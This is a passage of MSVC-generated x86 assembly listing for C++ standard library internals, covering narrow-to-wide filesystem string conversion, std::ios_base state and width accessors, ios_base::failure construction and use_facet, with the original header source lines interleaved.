  0004f	e8 00 00 00 00	 call	 ?data@?$basic_string_view@DU?$char_traits@D@std@@@std@@QBEPBDXZ ; std::basic_string_view<char,std::char_traits<char> >::data
  00054	89 45 d8	 mov	 DWORD PTR tv87[ebp], eax
  00057	6a 00		 push	 0
  00059	6a 00		 push	 0
  0005b	8b 4d dc	 mov	 ecx, DWORD PTR tv89[ebp]
  0005e	51		 push	 ecx
  0005f	8b 55 d8	 mov	 edx, DWORD PTR tv87[ebp]
  00062	52		 push	 edx
  00063	8b 45 0c	 mov	 eax, DWORD PTR __Code_page$[ebp]
  00066	50		 push	 eax
  00067	e8 00 00 00 00	 call	 ___std_fs_convert_narrow_to_wide@20
  0006c	89 45 c4	 mov	 DWORD PTR $T2[ebp], eax
  0006f	89 55 c8	 mov	 DWORD PTR $T2[ebp+4], edx
  00072	8b 4d c8	 mov	 ecx, DWORD PTR $T2[ebp+4]
  00075	51		 push	 ecx
  00076	8b 55 c4	 mov	 edx, DWORD PTR $T2[ebp]
  00079	52		 push	 edx
  0007a	e8 00 00 00 00	 call	 ?_Check_convert_result@std@@YAHU__std_fs_convert_result@@@Z ; std::_Check_convert_result
  0007f	83 c4 08	 add	 esp, 8
  00082	89 45 e0	 mov	 DWORD PTR __Len$3[ebp], eax

; 48   :                 _Code_page, _Input.data(), static_cast<int>(_Input.size()), nullptr, 0));
; 49   : 
; 50   :             _Output.resize(static_cast<size_t>(_Len));

  00085	6a 00		 push	 0
  00087	8b 45 e0	 mov	 eax, DWORD PTR __Len$3[ebp]
  0008a	50		 push	 eax
  0008b	8d 4d e4	 lea	 ecx, DWORD PTR __Output$[ebp]
  0008e	e8 00 00 00 00	 call	 ?resize@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEXI_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::resize

; 51   : 
; 52   :             (void) _Check_convert_result(__std_fs_convert_narrow_to_wide(

  00093	8d 4d e4	 lea	 ecx, DWORD PTR __Output$[ebp]
  00096	e8 00 00 00 00	 call	 ?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEPA_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::data
  0009b	89 45 d4	 mov	 DWORD PTR tv144[ebp], eax
  0009e	8d 4d 10	 lea	 ecx, DWORD PTR __Input$[ebp]
  000a1	e8 00 00 00 00	 call	 ?size@?$basic_string_view@DU?$char_traits@D@std@@@std@@QBEIXZ ; std::basic_string_view<char,std::char_traits<char> >::size
  000a6	89 45 d0	 mov	 DWORD PTR tv142[ebp], eax
  000a9	8d 4d 10	 lea	 ecx, DWORD PTR __Input$[ebp]
  000ac	e8 00 00 00 00	 call	 ?data@?$basic_string_view@DU?$char_traits@D@std@@@std@@QBEPBDXZ ; std::basic_string_view<char,std::char_traits<char> >::data
  000b1	89 45 cc	 mov	 DWORD PTR tv140[ebp], eax
  000b4	8b 4d e0	 mov	 ecx, DWORD PTR __Len$3[ebp]
  000b7	51		 push	 ecx
  000b8	8b 55 d4	 mov	 edx, DWORD PTR tv144[ebp]
  000bb	52		 push	 edx
  000bc	8b 45 d0	 mov	 eax, DWORD PTR tv142[ebp]
  000bf	50		 push	 eax
  000c0	8b 4d cc	 mov	 ecx, DWORD PTR tv140[ebp]
  000c3	51		 push	 ecx
  000c4	8b 55 0c	 mov	 edx, DWORD PTR __Code_page$[ebp]
  000c7	52		 push	 edx
  000c8	e8 00 00 00 00	 call	 ___std_fs_convert_narrow_to_wide@20
  000cd	89 45 bc	 mov	 DWORD PTR $T1[ebp], eax
  000d0	89 55 c0	 mov	 DWORD PTR $T1[ebp+4], edx
  000d3	8b 45 c0	 mov	 eax, DWORD PTR $T1[ebp+4]
  000d6	50		 push	 eax
  000d7	8b 4d bc	 mov	 ecx, DWORD PTR $T1[ebp]
  000da	51		 push	 ecx
  000db	e8 00 00 00 00	 call	 ?_Check_convert_result@std@@YAHU__std_fs_convert_result@@@Z ; std::_Check_convert_result
  000e0	83 c4 08	 add	 esp, 8
$LN2@Convert_na:

; 53   :                 _Code_page, _Input.data(), static_cast<int>(_Input.size()), _Output.data(), _Len));
; 54   :         }
; 55   : 
; 56   :         return _Output;

  000e3	8d 55 e4	 lea	 edx, DWORD PTR __Output$[ebp]
  000e6	52		 push	 edx
  000e7	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  000ea	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@$$QAV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  000ef	8d 4d e4	 lea	 ecx, DWORD PTR __Output$[ebp]
  000f2	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  000f7	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]
$LN1@Convert_na:

; 57   :     }

  000fa	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  000fd	33 cd		 xor	 ecx, ebp
  000ff	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00104	8b e5		 mov	 esp, ebp
  00106	5d		 pop	 ebp
  00107	c3		 ret	 0
?_Convert_narrow_to_wide@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@2@W4__std_code_page@@V?$basic_string_view@DU?$char_traits@D@std@@@2@@Z ENDP ; std::filesystem::_Convert_narrow_to_wide
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xiosbase
;	COMDAT ?getloc@ios_base@std@@QBE?AVlocale@2@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
___$ReturnUdt$ = 8					; size = 4
?getloc@ios_base@std@@QBE?AVlocale@2@XZ PROC		; std::ios_base::getloc, COMDAT
; _this$ = ecx

; 290  :     _NODISCARD locale __CLR_OR_THIS_CALL getloc() const noexcept /* strengthened */ { // get locale

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 291  :         return *_Ploc;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 48 30	 mov	 ecx, DWORD PTR [eax+48]
  0000d	51		 push	 ecx
  0000e	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00011	e8 00 00 00 00	 call	 ??0locale@std@@QAE@ABV01@@Z ; std::locale::locale
  00016	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 292  :     }

  00019	8b e5		 mov	 esp, ebp
  0001b	5d		 pop	 ebp
  0001c	c2 04 00	 ret	 4
?getloc@ios_base@std@@QBE?AVlocale@2@XZ ENDP		; std::ios_base::getloc
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xiosbase
;	COMDAT ?width@ios_base@std@@QAE_J_J@Z
_TEXT	SEGMENT
__Oldwidth$ = -12					; size = 8
_this$ = -4						; size = 4
__Newwidth$ = 8						; size = 8
?width@ios_base@std@@QAE_J_J@Z PROC			; std::ios_base::width, COMDAT
; _this$ = ecx

; 283  :     streamsize __CLR_OR_THIS_CALL width(streamsize _Newwidth) noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 284  :         // set width to argument
; 285  :         const streamsize _Oldwidth = _Wide;

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	8b 48 20	 mov	 ecx, DWORD PTR [eax+32]
  0000f	8b 50 24	 mov	 edx, DWORD PTR [eax+36]
  00012	89 4d f4	 mov	 DWORD PTR __Oldwidth$[ebp], ecx
  00015	89 55 f8	 mov	 DWORD PTR __Oldwidth$[ebp+4], edx

; 286  :         _Wide                      = _Newwidth;

  00018	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001b	8b 4d 08	 mov	 ecx, DWORD PTR __Newwidth$[ebp]
  0001e	8b 55 0c	 mov	 edx, DWORD PTR __Newwidth$[ebp+4]
  00021	89 48 20	 mov	 DWORD PTR [eax+32], ecx
  00024	89 50 24	 mov	 DWORD PTR [eax+36], edx

; 287  :         return _Oldwidth;

  00027	8b 45 f4	 mov	 eax, DWORD PTR __Oldwidth$[ebp]
  0002a	8b 55 f8	 mov	 edx, DWORD PTR __Oldwidth$[ebp+4]

; 288  :     }

  0002d	8b e5		 mov	 esp, ebp
  0002f	5d		 pop	 ebp
  00030	c2 08 00	 ret	 8
?width@ios_base@std@@QAE_J_J@Z ENDP			; std::ios_base::width
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xiosbase
;	COMDAT ?width@ios_base@std@@QBE_JXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?width@ios_base@std@@QBE_JXZ PROC			; std::ios_base::width, COMDAT
; _this$ = ecx

; 279  :     _NODISCARD streamsize __CLR_OR_THIS_CALL width() const noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 280  :         return _Wide;

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	8b 41 20	 mov	 eax, DWORD PTR [ecx+32]
  0000d	8b 51 24	 mov	 edx, DWORD PTR [ecx+36]

; 281  :     }

  00010	8b e5		 mov	 esp, ebp
  00012	5d		 pop	 ebp
  00013	c3		 ret	 0
?width@ios_base@std@@QBE_JXZ ENDP			; std::ios_base::width
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xiosbase
;	COMDAT ?flags@ios_base@std@@QBEHXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?flags@ios_base@std@@QBEHXZ PROC			; std::ios_base::flags, COMDAT
; _this$ = ecx

; 238  :     _NODISCARD fmtflags __CLR_OR_THIS_CALL flags() const noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 239  :         return _Fmtfl;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 40 14	 mov	 eax, DWORD PTR [eax+20]

; 240  :     }

  0000d	8b e5		 mov	 esp, ebp
  0000f	5d		 pop	 ebp
  00010	c3		 ret	 0
?flags@ios_base@std@@QBEHXZ ENDP			; std::ios_base::flags
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xiosbase
;	COMDAT ?good@ios_base@std@@QBE_NXZ
_TEXT	SEGMENT
_this$ = -8						; size = 4
tv67 = -4						; size = 4
?good@ios_base@std@@QBE_NXZ PROC			; std::ios_base::good, COMDAT
; _this$ = ecx

; 207  :     _NODISCARD bool __CLR_OR_THIS_CALL good() const noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 208  :         return rdstate() == ios_base::goodbit;

  00009	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0000c	e8 00 00 00 00	 call	 ?rdstate@ios_base@std@@QBEHXZ ; std::ios_base::rdstate
  00011	85 c0		 test	 eax, eax
  00013	75 09		 jne	 SHORT $LN3@good
  00015	c7 45 fc 01 00
	00 00		 mov	 DWORD PTR tv67[ebp], 1
  0001c	eb 07		 jmp	 SHORT $LN4@good
$LN3@good:
  0001e	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR tv67[ebp], 0
$LN4@good:
  00025	0f b6 45 fc	 movzx	 eax, BYTE PTR tv67[ebp]

; 209  :     }

  00029	8b e5		 mov	 esp, ebp
  0002b	5d		 pop	 ebp
  0002c	c3		 ret	 0
?good@ios_base@std@@QBE_NXZ ENDP			; std::ios_base::good
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xiosbase
;	COMDAT ?rdstate@ios_base@std@@QBEHXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?rdstate@ios_base@std@@QBEHXZ PROC			; std::ios_base::rdstate, COMDAT
; _this$ = ecx

; 188  :     _NODISCARD iostate __CLR_OR_THIS_CALL rdstate() const noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 189  :         return _Mystate;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 40 0c	 mov	 eax, DWORD PTR [eax+12]

; 190  :     }

  0000d	8b e5		 mov	 esp, ebp
  0000f	5d		 pop	 ebp
  00010	c3		 ret	 0
?rdstate@ios_base@std@@QBEHXZ ENDP			; std::ios_base::rdstate
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xiosbase
;	COMDAT ?clear@ios_base@std@@QAEXH_N@Z
_TEXT	SEGMENT
$T1 = -40						; size = 20
$T2 = -20						; size = 8
_this$ = -12						; size = 4
__Msg$3 = -8						; size = 4
__Filtered$ = -4					; size = 4
__State$ = 8						; size = 4
__Reraise$ = 12						; size = 1
?clear@ios_base@std@@QAEXH_N@Z PROC			; std::ios_base::clear, COMDAT
; _this$ = ecx

; 156  :     void __CLR_OR_THIS_CALL clear(iostate _State, bool _Reraise) { // set state, possibly reraise exception

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 28	 sub	 esp, 40			; 00000028H
  00006	89 4d f4	 mov	 DWORD PTR _this$[ebp], ecx

; 157  :         _State &= _Statmask;

  00009	8b 45 08	 mov	 eax, DWORD PTR __State$[ebp]
  0000c	83 e0 17	 and	 eax, 23			; 00000017H
  0000f	89 45 08	 mov	 DWORD PTR __State$[ebp], eax

; 158  :         _Mystate             = _State;

  00012	8b 4d f4	 mov	 ecx, DWORD PTR _this$[ebp]
  00015	8b 55 08	 mov	 edx, DWORD PTR __State$[ebp]
  00018	89 51 0c	 mov	 DWORD PTR [ecx+12], edx

; 159  :         const auto _Filtered = _State & _Except;

  0001b	8b 45 f4	 mov	 eax, DWORD PTR _this$[ebp]
  0001e	8b 4d 08	 mov	 ecx, DWORD PTR __State$[ebp]
  00021	23 48 10	 and	 ecx, DWORD PTR [eax+16]
  00024	89 4d fc	 mov	 DWORD PTR __Filtered$[ebp], ecx

; 160  :         if (_Filtered) {

  00027	74 63		 je	 SHORT $LN2@clear

; 161  :             if (_Reraise) {

  00029	0f b6 55 0c	 movzx	 edx, BYTE PTR __Reraise$[ebp]
  0002d	85 d2		 test	 edx, edx
  0002f	74 09		 je	 SHORT $LN3@clear

; 162  :                 _RERAISE;

  00031	6a 00		 push	 0
  00033	6a 00		 push	 0
  00035	e8 00 00 00 00	 call	 __CxxThrowException@8
$LN3@clear:

; 163  :             }
; 164  : 
; 165  :             const char* _Msg;
; 166  :             if (_Filtered & ios_base::badbit) {

  0003a	8b 45 fc	 mov	 eax, DWORD PTR __Filtered$[ebp]
  0003d	83 e0 04	 and	 eax, 4
  00040	74 09		 je	 SHORT $LN4@clear

; 167  :                 _Msg = "ios_base::badbit set";

  00042	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR __Msg$3[ebp], OFFSET ??_C@_0BF@PHHKMMFD@ios_base?3?3badbit?5set@
  00049	eb 18		 jmp	 SHORT $LN7@clear
$LN4@clear:

; 168  :             } else if (_Filtered & ios_base::failbit) {

  0004b	8b 4d fc	 mov	 ecx, DWORD PTR __Filtered$[ebp]
  0004e	83 e1 02	 and	 ecx, 2
  00051	74 09		 je	 SHORT $LN6@clear

; 169  :                 _Msg = "ios_base::failbit set";

  00053	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR __Msg$3[ebp], OFFSET ??_C@_0BG@FMKFHCIL@ios_base?3?3failbit?5set@

; 170  :             } else {

  0005a	eb 07		 jmp	 SHORT $LN7@clear
$LN6@clear:

; 171  :                 _Msg = "ios_base::eofbit set";

  0005c	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR __Msg$3[ebp], OFFSET ??_C@_0BF@OOHOMBOF@ios_base?3?3eofbit?5set@
$LN7@clear:

; 172  :             }
; 173  : 
; 174  :             _THROW(failure(_Msg));

  00063	6a 01		 push	 1
  00065	8d 55 ec	 lea	 edx, DWORD PTR $T2[ebp]
  00068	52		 push	 edx
  00069	e8 00 00 00 00	 call	 ?make_error_code@std@@YA?AVerror_code@1@W4io_errc@1@@Z ; std::make_error_code
  0006e	83 c4 08	 add	 esp, 8
  00071	50		 push	 eax
  00072	8b 45 f8	 mov	 eax, DWORD PTR __Msg$3[ebp]
  00075	50		 push	 eax
  00076	8d 4d d8	 lea	 ecx, DWORD PTR $T1[ebp]
  00079	e8 00 00 00 00	 call	 ??0failure@ios_base@std@@QAE@PBDABVerror_code@2@@Z ; std::ios_base::failure::failure
  0007e	68 00 00 00 00	 push	 OFFSET __TI5?AVfailure@ios_base@std@@
  00083	8d 4d d8	 lea	 ecx, DWORD PTR $T1[ebp]
  00086	51		 push	 ecx
  00087	e8 00 00 00 00	 call	 __CxxThrowException@8
$LN2@clear:
$LN1@clear:

; 175  :         }
; 176  :     }

  0008c	8b e5		 mov	 esp, ebp
  0008e	5d		 pop	 ebp
  0008f	c2 08 00	 ret	 8
?clear@ios_base@std@@QAEXH_N@Z ENDP			; std::ios_base::clear
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_Gfailure@ios_base@std@@UAEPAXI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___flags$ = 8						; size = 4
??_Gfailure@ios_base@std@@UAEPAXI@Z PROC		; std::ios_base::failure::`scalar deleting destructor', COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1failure@ios_base@std@@UAE@XZ
  0000f	8b 45 08	 mov	 eax, DWORD PTR ___flags$[ebp]
  00012	83 e0 01	 and	 eax, 1
  00015	74 0e		 je	 SHORT $LN2@scalar
  00017	6a 14		 push	 20			; 00000014H
  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	51		 push	 ecx
  0001d	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
  00022	83 c4 08	 add	 esp, 8
$LN2@scalar:
  00025	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00028	8b e5		 mov	 esp, ebp
  0002a	5d		 pop	 ebp
  0002b	c2 04 00	 ret	 4
??_Gfailure@ios_base@std@@UAEPAXI@Z ENDP		; std::ios_base::failure::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??0failure@ios_base@std@@QAE@ABV012@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___that$ = 8						; size = 4
??0failure@ios_base@std@@QAE@ABV012@@Z PROC		; std::ios_base::failure::failure, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 08	 mov	 eax, DWORD PTR ___that$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000e	e8 00 00 00 00	 call	 ??0system_error@std@@QAE@ABV01@@Z
  00013	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00016	c7 01 00 00 00
	00		 mov	 DWORD PTR [ecx], OFFSET ??_7failure@ios_base@std@@6B@
  0001c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001f	8b e5		 mov	 esp, ebp
  00021	5d		 pop	 ebp
  00022	c2 04 00	 ret	 4
??0failure@ios_base@std@@QAE@ABV012@@Z ENDP		; std::ios_base::failure::failure
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1failure@ios_base@std@@UAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1failure@ios_base@std@@UAE@XZ PROC			; std::ios_base::failure::~failure, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1system_error@std@@UAE@XZ
  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??1failure@ios_base@std@@UAE@XZ ENDP			; std::ios_base::failure::~failure
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xiosbase
;	COMDAT ??0failure@ios_base@std@@QAE@PBDABVerror_code@2@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Message$ = 8						; size = 4
__Errcode$ = 12						; size = 4
??0failure@ios_base@std@@QAE@PBDABVerror_code@2@@Z PROC	; std::ios_base::failure::failure, COMDAT
; _this$ = ecx

; 118  :         explicit failure(const char* _Message, const error_code& _Errcode = _STD make_error_code(io_errc::stream))

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 119  :             : system_error(_Errcode, _Message) {} // construct with message

  00007	8b 45 08	 mov	 eax, DWORD PTR __Message$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d 0c	 mov	 ecx, DWORD PTR __Errcode$[ebp]
  0000e	8b 51 04	 mov	 edx, DWORD PTR [ecx+4]
  00011	52		 push	 edx
  00012	8b 01		 mov	 eax, DWORD PTR [ecx]
  00014	50		 push	 eax
  00015	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00018	e8 00 00 00 00	 call	 ??0system_error@std@@QAE@Verror_code@1@PBD@Z ; std::system_error::system_error
  0001d	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00020	c7 01 00 00 00
	00		 mov	 DWORD PTR [ecx], OFFSET ??_7failure@ios_base@std@@6B@
  00026	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00029	8b e5		 mov	 esp, ebp
  0002b	5d		 pop	 ebp
  0002c	c2 08 00	 ret	 8
??0failure@ios_base@std@@QAE@PBDABVerror_code@2@@Z ENDP	; std::ios_base::failure::failure
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Adl_verify_range@PADPBD@std@@YAXABQADABQBD@Z
_TEXT	SEGMENT
__First$ = 8						; size = 4
__Last$ = 12						; size = 4
??$_Adl_verify_range@PADPBD@std@@YAXABQADABQBD@Z PROC	; std::_Adl_verify_range<char *,char const *>, COMDAT

; 1162 : constexpr void _Adl_verify_range(const _Iter& _First, const _Sentinel& _Last) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1163 :     // check that [_First, _Last) forms an iterator range
; 1164 :     if constexpr (_Range_verifiable_v<_Iter, _Sentinel>) {
; 1165 :         _Verify_range(_First, _Last);
; 1166 :     }
; 1167 : }

  00003	5d		 pop	 ebp
  00004	c3		 ret	 0
??$_Adl_verify_range@PADPBD@std@@YAXABQADABQBD@Z ENDP	; std::_Adl_verify_range<char *,char const *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ??$use_facet@V?$ctype@D@std@@@std@@YAABV?$ctype@D@0@ABVlocale@0@@Z
_TEXT	SEGMENT
$T1 = -28						; size = 4
__Lock$2 = -24						; size = 4
__Id$3 = -20						; size = 4
__Psave_guard$4 = -16					; size = 4
__Pf$5 = -12						; size = 4
__Pfmod$6 = -8						; size = 4
__Psave$7 = -4						; size = 4
__Loc$ = 8						; size = 4
??$use_facet@V?$ctype@D@std@@@std@@YAABV?$ctype@D@0@ABVlocale@0@@Z PROC ; std::use_facet<std::ctype<char> >, COMDAT

; 416  : const _Facet& __CRTDECL use_facet(const locale& _Loc) { // get facet reference from locale

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 1c	 sub	 esp, 28			; 0000001cH

; 417  :     _BEGIN_LOCK(_LOCK_LOCALE) // the thread lock, make get atomic

  00006	6a 00		 push	 0
  00008	8d 4d e8	 lea	 ecx, DWORD PTR __Lock$2[ebp]
  0000b	e8 00 00 00 00	 call	 ??0_Lockit@std@@QAE@H@Z	; std::_Lockit::_Lockit

; 418  :     const locale::facet* _Psave = _Facetptr<_Facet>::_Psave; // static pointer to lazy facet

  00010	a1 00 00 00 00	 mov	 eax, DWORD PTR ?_Psave@?$_Facetptr@V?$ctype@D@std@@@std@@2PBVfacet@locale@2@B ; std::_Facetptr<std::ctype<char> >::_Psave
  00015	89 45 fc	 mov	 DWORD PTR __Psave$7[ebp], eax

; 419  : 
; 420  :     const size_t _Id         = _Facet::id;

  00018	b9 00 00 00 00	 mov	 ecx, OFFSET ?id@?$ctype@D@std@@2V0locale@2@A ; std::ctype<char>::id
  0001d	e8 00 00 00 00	 call	 ??Bid@locale@std@@QAEIXZ ; std::locale::id::operator unsigned int
  00022	89 45 ec	 mov	 DWORD PTR __Id$3[ebp], eax

; 421  :     const locale::facet* _Pf = _Loc._Getfacet(_Id);

  00025	8b 4d ec	 mov	 ecx, DWORD PTR __Id$3[ebp]
  00028	51		 push	 ecx
  00029	8b 4d 08	 mov	 ecx, DWORD PTR __Loc$[ebp]
  0002c	e8 00 00 00 00	 call	 ?_Getfacet@locale@std@@QBEPBVfacet@12@I@Z ; std::locale::_Getfacet
  00031	89 45 f4	 mov	 DWORD PTR __Pf$5[ebp], eax

; 422  : 
; 423  :     if (!_Pf) {

  00034	83 7d f4 00	 cmp	 DWORD PTR __Pf$5[ebp], 0
  00038	75 73		 jne	 SHORT $LN6@use_facet

; 424  :         if (_Psave) {

  0003a	83 7d fc 00	 cmp	 DWORD PTR __Psave$7[ebp], 0
  0003e	74 08		 je	 SHORT $LN3@use_facet

; 425  :             _Pf = _Psave; // lazy facet already allocated

  00040	8b 55 fc	 mov	 edx, DWORD PTR __Psave$7[ebp]
  00043	89 55 f4	 mov	 DWORD PTR __Pf$5[ebp], edx
  00046	eb 65		 jmp	 SHORT $LN6@use_facet
$LN3@use_facet:

; 426  :         } else if (_Facet::_Getcat(&_Psave, &_Loc) == static_cast<size_t>(-1)) {

  00048	8b 45 08	 mov	 eax, DWORD PTR __Loc$[ebp]
  0004b	50		 push	 eax
  0004c	8d 4d fc	 lea	 ecx, DWORD PTR __Psave$7[ebp]
  0004f	51		 push	 ecx
  00050	e8 00 00 00 00	 call	 ?_Getcat@?$ctype@D@std@@SAIPAPBVfacet@locale@2@PBV42@@Z ; std::ctype<char>::_Getcat
  00055	83 c4 08	 add	 esp, 8
  00058	83 f8 ff	 cmp	 eax, -1
  0005b	75 07		 jne	 SHORT $LN5@use_facet

; 427  : #if _HAS_EXCEPTIONS
; 428  :             _Throw_bad_cast(); // lazy disallowed

  0005d	e8 00 00 00 00	 call	 ?_Throw_bad_cast@std@@YAXXZ ; std::_Throw_bad_cast

; 429  : #else
; 430  :             _CSTD abort(); // lazy disallowed
; 431  : #endif
; 432  :         } else { // queue up lazy facet for destruction

  00062	eb 49		 jmp	 SHORT $LN6@use_facet
$LN5@use_facet:

; 433  :             auto _Pfmod = const_cast<locale::facet*>(_Psave);

  00064	8b 55 fc	 mov	 edx, DWORD PTR __Psave$7[ebp]
  00067	89 55 f8	 mov	 DWORD PTR __Pfmod$6[ebp], edx

; 434  :             unique_ptr<_Facet_base> _Psave_guard(static_cast<_Facet_base*>(_Pfmod));

  0006a	8b 45 f8	 mov	 eax, DWORD PTR __Pfmod$6[ebp]
  0006d	50		 push	 eax
  0006e	8d 4d f0	 lea	 ecx, DWORD PTR __Psave_guard$4[ebp]
  00071	e8 00 00 00 00	 call	 ??$?0U?$default_delete@V_Facet_base@std@@@std@@$0A@@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAE@PAV_Facet_base@1@@Z ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> ><std::default_delete<std::_Facet_base>,0>

